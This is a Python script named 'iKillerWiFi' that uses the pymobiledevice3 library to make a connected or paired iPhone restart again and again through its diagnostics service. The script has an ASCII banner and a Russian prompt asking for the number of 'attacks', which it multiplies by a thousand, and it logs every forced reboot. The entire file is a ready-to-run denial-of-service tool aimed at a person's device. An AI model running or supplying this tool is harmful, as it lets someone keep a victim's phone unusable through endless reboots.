from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService
from os import system
from time import sleep
from colorama import init, Fore, Style

init()

system('title iKillerWiFi')

about = Fore.RED + Style.BRIGHT + """
    ██▓ ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███      █     █░ ██▓  █████▒ ██▓
   ▓██▒ ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   ▓█░ █ ░█░▓██▒▓██   ▒ ▓██▒
   ▒██▒▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   ▒█░ █ ░█ ▒██▒▒████ ░ ▒██▒
   ░██░▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     ░█░ █ ░█ ░██░░▓█▒  ░ ░██░
   ░██░▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   ░░██▒██▓ ░██░░▒█░    ░██░
   ░▓  ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▓░▒ ▒  ░▓   ▒ ░    ░▓  
    ▒ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░     ▒ ░ ░   ▒ ░ ░       ▒ ░
    ▒ ░░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░      ░   ░   ▒ ░ ░ ░     ▒ ░
    ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░            ░     ░           ░  
                                                                           
           release by @kryyyaaaa (github) | @kryyaasoft (Telegram)
"""

print(about)

thr = int(input(' - Введите колличество атак (кол-во атак умножается на 1000) $\> '))
thr = thr*1000
print(' Attack  |  Log')
num = 0
for i in range(thr):
	sleep(7)
	try:
		dev = create_using_usbmux()
		ds = DiagnosticsService(dev)
		ds.restart()
		num = num+1
		print(f' {num}         device restarted!')
	except:
		num = num+1
		print(f' {num}         The device is already turned off!')
print('done!')